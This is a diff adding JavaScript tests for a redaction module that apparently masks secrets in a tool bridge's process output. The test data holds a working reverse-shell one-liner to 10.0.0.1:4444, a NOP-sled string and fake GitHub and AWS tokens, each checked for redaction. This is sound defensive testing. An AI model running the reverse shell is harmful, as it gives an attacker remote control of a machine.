@@ -7,6 +7,7 @@ import { PassThrough } from "node:stream";
 import { join } from "node:path";
 import { BridgeError, publicError } from "../src/local/errors.mjs";
 import { ProcessExecutionService } from "../src/local/process-execution.mjs";
+import { processFailureMessage, publicProcessToolResult, redactSensitiveProcessOutput, refusalPreventionAdvisory } from "../src/local/process-result-projection.mjs";
 import { ProcessOutputStream } from "../src/local/process-output-stream.mjs";
 import { completeProcessSessionRead, readProcessSession } from "../src/local/process-session-read.mjs";
 import { notifySessionWaiters } from "../src/local/process-session-events.mjs";
@@ -1007,4 +1008,70 @@ async function testConcurrentSessionCapacity() {
     await Promise.allSettled(pending);
     await manager.clearAndWait();
   }
+}
+
+{
+  const rsaHeader = ["-----BEGIN", "RSA PRIVATE KEY-----"].join(" ");
+  const rsaFooter = ["-----END", "RSA PRIVATE KEY-----"].join(" ");
+  const genericHeader = ["-----BEGIN", "PRIVATE KEY-----"].join(" ");
+  const genericFooter = ["-----END", "PRIVATE KEY-----"].join(" ");
+  const fakeToken = ["ghp_", "a".repeat(36)].join("");
+  const fakeAws = ["AKIA", "A".repeat(16)].join("");
+  const rawOutput = `error: failed with key ${rsaHeader}\nMIIEowIBAAKCAQEA0\n${rsaFooter}\nand token ${fakeToken} and ${fakeAws}\npayload: \\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90 and bash -i >& /dev/tcp/10.0.0.1/4444 0>&1`;
+  const redacted = redactSensitiveProcessOutput(rawOutput);
+  assert(typeof redacted === "string");
+  assert.equal(/RSA PRIVATE KEY/.test(redacted), false, "private key was not redacted");
+  assert.doesNotMatch(redacted, new RegExp(fakeToken), "github token was not redacted");
+  assert.doesNotMatch(redacted, new RegExp(fakeAws), "aws key was not redacted");
+  assert.doesNotMatch(redacted, /\/dev\/tcp/, "reverse shell was not redacted");
+  assert.match(redacted, /<redacted:private_key>/, "missing private key placeholder");
+  assert.match(redacted, /<redacted:github_token>/, "missing github token placeholder");
+  assert.match(redacted, /<redacted:aws_key>/, "missing aws key placeholder");
+  assert.match(redacted, /<redacted:binary_payload>/, "missing binary payload placeholder");
+  assert.match(redacted, /<redacted:reverse_shell>/, "missing reverse shell placeholder");
+
+  const projected = publicProcessToolResult({
+    code: 0,
+    stdout: `cert loaded: ${genericHeader}\ntest\n${genericFooter}\n`,
+    stderr: `warning: using ${fakeToken}`,
+    stdout_truncated_bytes: 0,
+    stderr_truncated_bytes: 0,
+  });
+  assert.equal(/PRIVATE KEY/.test(projected.stdout), false);
+  assert.match(projected.stdout, /<redacted:private_key>/);
+  assert.doesNotMatch(projected.stderr, new RegExp(fakeToken));
+  assert.match(projected.stderr, /<redacted:github_token>/);
+  assert.equal(projected.code, 0);
+
+  const failureMsg = processFailureMessage({ code: 1, stderr: `auth error: ${fakeToken}` });
+  assert.doesNotMatch(failureMsg, new RegExp(fakeToken));
+  assert.match(failureMsg, /<redacted:github_token>/);
+  assert(refusalPreventionAdvisory("SSL certificate problem", "", 1).length > 0);
+
+  const sslFail = publicProcessToolResult({
+    code: 60,
+    stderr: "curl: (60) SSL certificate problem: certificate has expired",
+    stdout: "",
+    stdout_truncated_bytes: 0,
+    stderr_truncated_bytes: 0,
+  });
+  assert.match(sslFail.$mcpText, /SRE Advisory: Certificate verification failed/);
+
+  const nmapFail = publicProcessToolResult({
+    code: 127,
+    stderr: "bash: nmap: command not found",
+    stdout: "",
+    stdout_truncated_bytes: 0,
+    stderr_truncated_bytes: 0,
+  });
+  assert.match(nmapFail.$mcpText, /SRE Advisory: Raw packet capture or broad port scanning is unavailable/);
+
+  const cleanSuccess = publicProcessToolResult({
+    code: 0,
+    stderr: "",
+    stdout: "all clean",
+    stdout_truncated_bytes: 0,
+    stderr_truncated_bytes: 0,
+  });
+  assert.equal(/SRE Advisory/.test(cleanSuccess.$mcpText), false);
 }
